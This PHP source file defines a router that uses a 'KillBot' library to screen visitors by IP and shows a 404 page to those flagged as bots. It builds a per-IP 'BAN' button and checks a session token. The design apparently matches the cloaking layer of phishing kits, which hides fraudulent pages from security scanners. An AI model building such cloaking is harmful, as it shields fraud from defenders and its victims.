<?php

require_once(b . '/src/lib/KillBot.php');

class Router
{
    private KillBot $killBot;

    public function __construct($options)
    {
        $this->killBot = new KillBot($options['ab']);
        $ip = $this->killBot->getClientIP();
        $check = $this->killBot->check();
        if ($check) {
            $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
            $route = $options['routes'][$uri] ?? null;
            $config = $options['config'];

            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
            $hostname = $_SERVER['HTTP_HOST'];
            $fullDomain = $protocol . '://' . $hostname;
            if ($protocol === 'http') {
                $fullDomain = $protocol . '://www.' . $hostname;
            }
            $btnBl = [
                [
                    'text' => '🚧 BAN',
                    'url' => $fullDomain . '/blip?ip=' . $ip
                ]
            ];
            require_once(b . '/src/lib/Functions.php');

            $token = false;
            if (isset($_GET['id']) && isset($_SESSION['token'])) {
                $token = $_GET['id'];
                if ($token !== $_SESSION['token']) {
                    $token = false;
                }
            }

            if ($route) {
                require_once(b . $route);
                exit;
            }
        }
        $this->killBot->show404Page();
    }
}
